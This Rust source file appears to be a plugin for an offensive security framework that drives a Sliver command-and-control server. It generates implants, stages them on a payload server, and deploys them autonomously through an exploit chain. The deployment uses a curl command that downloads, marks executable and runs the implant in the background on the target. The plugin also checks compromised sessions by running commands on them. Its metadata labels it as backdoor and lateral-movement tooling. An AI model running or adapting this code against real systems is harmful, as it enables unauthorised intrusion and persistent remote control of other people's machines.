use crate::plugins::{ScannerPlugin, Capability};
use crate::models::{TargetHost, Finding, Severity, Category};
use crate::core::orchestrator::c2::{C2Operator, C2Session, SessionState};
use crate::utils::executor::{StealthExecutor, ExecutorMode};
use async_trait::async_trait;
use anyhow::{Result, Context};
use tracing::{info, warn};
use std::sync::Arc;
use serde_json::Value;

pub struct SovereignSliverOperator<M: ExecutorMode> {
    grpc_client: Option<Arc<SliverGrpcClient>>,
    executor: Arc<StealthExecutor<M>>,
}

struct SliverGrpcClient {
    client: reqwest::Client,
    base_url: String,
    auth_token: Option<String>,
}

impl SliverGrpcClient {
    async fn new(proxy_manager: &crate::utils::proxy::ProxyManager, server_addr: &str) -> Result<Self> {
        // --- V14.2 HARDENING: DNS Resolve & Pinning ---
        let addr = tokio::net::lookup_host(format!("{}:31337", server_addr)).await?
            .next()
            .ok_or_else(|| anyhow::anyhow!("C2 DNS resolution failed for {}", server_addr))?;
            
        let client = crate::utils::stealth_http::StealthClientBuilder::build_pinned_infra(
            proxy_manager, 
            server_addr, 
            addr
        )?;
        
        Ok(Self {
            client,
            base_url: format!("http://{}:31337/api", server_addr),
            auth_token: std::env::var("SLIVER_TOKEN").ok(),
        })
    }

    async fn generate_implant(&self, callback_host: &str, target_os: &str) -> Result<String> {
        let payload = serde_json::json!({
            "config": {
                "GOOS": target_os,
                "GOARCH": "amd64",
                "Format": "EXECUTABLE",
                "C2": [{
                    "URL": format!("mtls://{}:8888", callback_host),
                    "Priority": 1
                }]
            }
        });

        let mut req = self.client.post(format!("{}/generate", self.base_url))
            .json(&payload);
        
        if let Some(ref token) = self.auth_token {
            req = req.bearer_auth(token);
        }

        let response = req.send().await.context("Failed to generate implant")?;
        let result: Value = response.json().await?;
        
        result.get("File")
            .and_then(|f| f.as_str())
            .map(|s| s.to_string())
            .ok_or_else(|| anyhow::anyhow!("No implant file returned"))
    }

    async fn list_sessions(&self) -> Result<Vec<Value>> {
        let mut req = self.client.get(format!("{}/sessions", self.base_url));
        
        if let Some(ref token) = self.auth_token {
            req = req.bearer_auth(token);
        }

        let response = req.send().await.context("Failed to list sessions")?;
        let result: Value = response.json().await?;
        
        Ok(result.get("sessions")
            .and_then(|s| s.as_array())
            .cloned()
            .unwrap_or_default())
    }

    async fn execute_command(&self, session_id: &str, command: &str) -> Result<String> {
        let payload = serde_json::json!({
            "SessionID": session_id,
            "Command": command,
            "Timeout": 30
        });

        let mut req = self.client.post(format!("{}/sessions/{}/execute", self.base_url, session_id))
            .json(&payload);
        
        if let Some(ref token) = self.auth_token {
            req = req.bearer_auth(token);
        }

        let response = req.send().await.context("Failed to execute command")?;
        let result: Value = response.json().await?;
        
        Ok(result.get("Output")
            .and_then(|o| o.as_str())
            .unwrap_or("")
            .to_string())
    }
}

impl<M: ExecutorMode> SovereignSliverOperator<M> {
    pub async fn new(executor: Arc<StealthExecutor<M>>) -> Result<Self> {
        let server_addr = std::env::var("SLIVER_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
        
        let grpc_client = if let Some(pm) = executor.get_proxy_manager() {
            Some(Arc::new(SliverGrpcClient::new(&pm, &server_addr).await?))
        } else {
            None
        };

        Ok(Self {
            grpc_client,
            executor,
        })
    }

    async fn get_callback_host(&self) -> Result<String> {
        if let Some(pm) = self.executor.get_proxy_manager() {
            Ok(pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string()))
        } else {
            Ok("127.0.0.1".to_string())
        }
    }
}

#[async_trait]
impl<M: ExecutorMode> C2Operator for SovereignSliverOperator<M> {
    async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
        let client = self.grpc_client.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No gRPC client available"))?;
        
        let callback_host = self.get_callback_host().await?;
        let target_os = match target.target_type {
            crate::models::TargetType::Windows => "windows",
            crate::models::TargetType::Linux => "linux",
            _ => target.extra_data.get("os").and_then(|v| v.as_str()).unwrap_or("linux"),
        };
        
        info!("🔱 SOVEREIGN: Generating autonomous implant for {} (OS: {})", target.host, target_os);
        
        let implant_path = client.generate_implant(&callback_host, target_os).await
            .context("Autonomous implant generation failed")?;
        
        info!("✅ SOVEREIGN: Implant generated at {}", implant_path);
        Ok(implant_path)
    }

    async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
        info!("🚀 SOVEREIGN: Initiating autonomous deployment to {}", target.host);
        
        // Stage payload on managed infrastructure
        let callback_host = self.get_callback_host().await?;
        let staging_server = crate::utils::payload_server::PayloadServer::new();
        let token = staging_server.stage_payload(std::path::PathBuf::from(payload_path)).await;
        let port = staging_server.start().await?;
        
        // Construct deployment vector
        let implant_name = std::path::Path::new(payload_path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("implant");
        
        let deployment_cmd = format!(
            "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && nohup /tmp/{} >/dev/null 2>&1 &",
            callback_host, port, token, implant_name, implant_name, implant_name
        );
        
        // Execute through validated exploit chain
        self.executor.execute_remote(target, &deployment_cmd).await
            .context("Autonomous deployment failed")?;
        
        info!("✅ SOVEREIGN: Deployment vector executed");
        Ok(())
    }

    async fn verify_session(&self, target: &TargetHost) -> Result<SessionState> {
        let client = self.grpc_client.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No gRPC client available"))?;
        
        let sessions = client.list_sessions().await?;
        
        for session in sessions {
            if let Some(remote_addr) = session.get("RemoteAddress").and_then(|v| v.as_str()) {
                if remote_addr.contains(&target.host) || 
                   (target.ip.is_some() && remote_addr.contains(target.ip.as_ref().unwrap())) {
                    
                    let session_id = session.get("ID").and_then(|v| v.as_str()).unwrap_or("");
                    
                    // --- V14.2 mTLS Fingerprint Verification ---
                    if let Some(expected_fp) = target.tactical_context.get("c2_fingerprint").and_then(|v| v.as_str()) {
                        let actual_fp = session.get("CertificateFingerprint").and_then(|v| v.as_str()).unwrap_or("");
                        
                        let op = crate::core::orchestrator::c2::typestate::SliverOperator::<crate::core::orchestrator::c2::typestate::Established>::new()
                            .with_fingerprint(expected_fp.to_string());
                        
                        if op.promote(actual_fp).is_err() {
                            warn!("❌ V14.2 SOVEREIGN: mTLS Fingerprint MISMATCH for {}. Session is NOT sovereign.", target.host);
                            return Ok(SessionState::Established);
                        }
                        info!("✅ V14.2 SOVEREIGN: mTLS fingerprint verified for {}", target.host);
                    }

                    // Verify session sovereignty with command execution
                    match client.execute_command(session_id, "whoami").await {
                        Ok(output) if !output.is_empty() => {
                            info!("🎯 SOVEREIGN: Active session verified for {}", target.host);
                            return Ok(SessionState::Sovereign);
                        }
                        _ => return Ok(SessionState::Established),
                    }
                }
            }
        }
        
        Ok(SessionState::Staged)
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let client = self.grpc_client.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No gRPC client available"))?;
        
        let sessions = client.list_sessions().await?;
        
        Ok(sessions.into_iter().map(|s| C2Session {
            id: s.get("ID").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
            target: s.get("RemoteAddress").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
            state: SessionState::Established,
            last_checkin: chrono::Utc::now(),
            fingerprint: s.get("CertificateFingerprint").and_then(|v| v.as_str()).map(|s| s.to_string()),
        }).collect())
    }
}

#[async_trait]
impl<M: ExecutorMode> ScannerPlugin for SovereignSliverOperator<M> {
    fn name(&self) -> &'static str {
        "SovereignSliverOperator"
    }
    
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            name: self.name().to_string(),
            description: "Sovereign Sliver C2 Operator: Autonomous gRPC-based session management".to_string(),
            target_type: crate::plugins::TargetType::Host,
            risk_level: crate::plugins::RiskLevel::High,
            layer: crate::core::capability_layer::ScanLayer::PostExploitation,
            expected_duration: std::time::Duration::from_secs(180),
            capabilities: vec![Capability::VulnerabilityScanning],
            cost: 15,
            category: "Lateral Movement".to_string(),
            mitre_attacks: vec!["T1105".to_string(), "T1071".to_string(), "T1090".to_string()],
            exploit_difficulty: crate::plugins::RiskLevel::High,
            blackarch_category: Some("backdoor".to_string()),
            is_destructive: false,
            poc_mode: false, ..Default::default() }
    }
    
    fn capabilities(&self) -> Vec<Capability> {
        vec![Capability::VulnerabilityScanning]
    }
    
    async fn check_dependencies(&self) -> Result<bool> {
        Ok(self.grpc_client.is_some())
    }
    
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        
        match self.verify_session(target).await? {
            SessionState::Sovereign => {
                findings.push(Finding::new(
                    "C2-SESSION-SOVEREIGN",
                    Category::Vulnerability,
                    Severity::Critical,
                    &format!("🔱 Sovereign C2 session established on {}", target.host),
                    serde_json::json!({
                        "status": "sovereign",
                        "operator": "sliver_grpc",
                        "protocol": "mtls",
                        "autonomous": true
                    })
                ));
            }
            SessionState::Established => {
                findings.push(Finding::new(
                    "C2-SESSION-ESTABLISHED",
                    Category::Vulnerability,
                    Severity::High,
                    &format!("C2 session established on {}", target.host),
                    serde_json::json!({
                        "status": "established",
                        "operator": "sliver_grpc"
                    })
                ));
            }
            _ => {
                // Attempt autonomous establishment
                if let Ok(payload_path) = self.prepare_payload(target).await {
                    findings.push(Finding::new(
                        "C2-IMPLANT-READY",
                        Category::Vulnerability,
                        Severity::Medium,
                        &format!("Autonomous C2 implant prepared for {}", target.host),
                        serde_json::json!({
                            "payload_path": payload_path,
                            "autonomous": true
                        })
                    ));
                }
            }
        }
        
        Ok(findings)
    }

    fn as_c2_operator(&self) -> Option<&dyn C2Operator> {
        Some(self)
    }
}